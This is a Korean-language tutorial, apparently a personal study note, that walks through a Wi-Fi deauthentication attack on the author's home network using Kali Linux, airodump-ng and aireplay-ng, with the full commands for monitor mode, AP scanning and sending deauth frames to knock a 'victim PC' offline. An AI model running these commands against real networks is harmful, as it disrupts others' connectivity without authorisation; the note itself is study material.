## 준비물

KALI LINUX

무선랜 (모니터 모드 지원)


<img src="https://github.com/user-attachments/assets/07811869-5c47-43fa-b1cd-816635423339" width="300">

칼리리눅스에 무선랜을 연결한다.

<br>

ifconfig를 통해 무선랜 이름을 확인한다⇒ wlan0

```php
$ ifconfig
...

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ce:97:e5:22:f7:b7  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

<br>

### 패킷 캡처 - 모니터 모드로 전환

```php
$ sudo ifconfig wlan0 down  
$ sudo iwconfig wlan0 mode monitor  
$ sudo ifconfig wlan0 up  
```

<br>

### 네트워크 스캔 (주변 AP)

```
$ sudo airodump-ng wlan0 
```

<img src="https://github.com/user-attachments/assets/da27c35c-f59d-4fac-84fc-8afa55980324" width="500">

우리집 와파의 MAC주소를 확인할 수 있다.

<br>


피해 대상인 PC의 CMD창에서 `ipconfig /all`  ⇒ 물리적 주소 확인

```php
무선 LAN 어댑터 Wi-Fi:

   연결별 DNS 접미사. . . . :
   설명. . . . . . . . . . . . : Intel(R) Wi-Fi 6E AX211 160MHz
   물리적 주소 . . . . . . . . : [🍮여기]
   DHCP 사용 . . . . . . . . . : 예
   자동 구성 사용. . . . . . . : 예
   링크-로컬 IPv6 주소 . . . . : .
   IPv4 주소 . . . . . . . . . : .
   서브넷 마스크 . . . . . . . : 255.255.255.0
   임대 시작 날짜. . . . . . . : 2024년 8월 17일 토요일 오후 9:55:35
   임대 만료 날짜. . . . . . . : 2024년 8월 18일 일요일 오전 1:55:55
   기본 게이트웨이 . . . . . . : 192.168.0.1
   DHCP 서버 . . . . . . . . . : 192.168.0.1
   ...
```

<br>

### 연결 끊기 (컴퓨터)

```
aireplay-ng --deauth [패킷 수. 보통 100000] -a [AP MAC 주소] -c [클라이언트 MAC 주소] [인터페이스 이름]
```

<img src="https://github.com/user-attachments/assets/a07fa437-d4ea-4091-ad1e-cbeee02ba28e" width="500">

명령을 실행하면 피해PC의 WiFi 연결이 끊긴다. 


<br>

모니터모드 해제

```php
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode managed
sudo ifconfig wlan0 up
```

